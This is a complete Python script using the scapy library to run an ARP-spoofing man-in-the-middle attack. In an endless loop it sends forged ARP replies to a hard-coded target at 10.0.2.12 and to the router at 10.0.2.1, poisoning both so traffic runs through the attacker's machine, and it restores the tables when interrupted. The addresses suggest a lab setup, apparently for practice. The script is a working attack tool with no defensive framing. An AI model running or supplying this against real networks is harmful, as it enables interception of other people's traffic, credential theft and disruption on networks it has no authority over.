#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    #scapy.arping(ip)
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)[0]

    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(target_ip, spoof_ip):

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip, hwsrc=get_mac(spoof_ip))
    scapy.send(packet, verbose=False, count=4)

cnt = 0

target_ip = "10.0.2.12"
router_ip = "10.0.2.1"

try:
    while True:
        cnt = cnt + 1
        spoof(target_ip,router_ip)
        spoof(router_ip,target_ip)
        print("\rSent two packets, revision # " + str(cnt), end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("\nRestoring....")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    print("Quitting....")
